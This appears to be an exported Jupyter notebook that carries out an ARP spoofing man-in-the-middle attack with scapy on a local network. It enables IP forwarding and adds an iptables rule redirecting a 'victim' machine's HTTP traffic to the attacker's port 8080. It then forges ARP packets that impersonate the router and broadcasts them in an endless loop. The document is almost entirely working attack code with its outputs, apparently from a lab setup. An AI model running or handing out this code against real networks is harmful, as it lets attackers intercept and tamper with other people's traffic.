
# In[1]:

from scapy.all import *
import os
import time
from ipInfo import *


# Out[1]:

#     WARNING: No route found for IPv6 destination :: (no default route?)
#     WARNING:scapy.runtime:No route found for IPv6 destination :: (no default route?)
# 

# In[2]:

#Ip Addresses etc. from my ipInfo helper module
printIpInfo()


# Out[2]:

#     interface : eth0                
#     victimIp  : 192.168.1.133       
#     routerIp  : 192.168.1.1         
#     myIp      : 192.168.1.132       
# 

# In[3]:

#turn on IP port forwarding so we can behave like a router
#and get our NIC to accept packets not addressed to us
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

#re-route traffic to our local tcp server
os.system("/sbin/iptables -t nat -F") #clear existing rules
os.system("/sbin/iptables -t nat -A PREROUTING -p tcp -s "+victimIp+" --dport 80 -j DNAT --to-destination " + myIp + ":8080")

#disallow ICMP redirects
#this keeps TCP/IP from picking a better route than through
#the attack machine if you just want to passively watch traffic
#os.system("echo 0 > /proc/sys/net/ipv4/conf/"+interface+"/send_redirects")


# Out[3]:

#     0

# In[4]:

#Build the ARP packet to be sent to the victim
#saying I am the router
victimPacket = ARP()
victimPacket.psrc = routerIp
victimPacket.pdst = victimIp
victimPacket.hwsrc = get_if_hwaddr(interface)
victimPacket.hwdst = 'ff:ff:ff:ff:ff:ff'
victimPacket.op = 1 # arp request (who-has)

victimPacket.display()


# Out[4]:

#     ###[ ARP ]###
#       hwtype    = 0x1
#       ptype     = 0x800
#       hwlen     = 6
#       plen      = 4
#       op        = who-has
#       hwsrc     = ba:db:ee:f1:23:45
#       psrc      = 192.168.1.1
#       hwdst     = ff:ff:ff:ff:ff:ff
#       pdst      = 192.168.1.133
# 

# In[5]:

send(victimPacket)


# Out[5]:

#     
#     Sent 1 packets.
# 

# In[*]:

while(1):
    send(victimPacket,verbose=0)
#    send(routerPacket,verbose=0)
    time.sleep(.5) # wait for 1 second


# In[ ]:



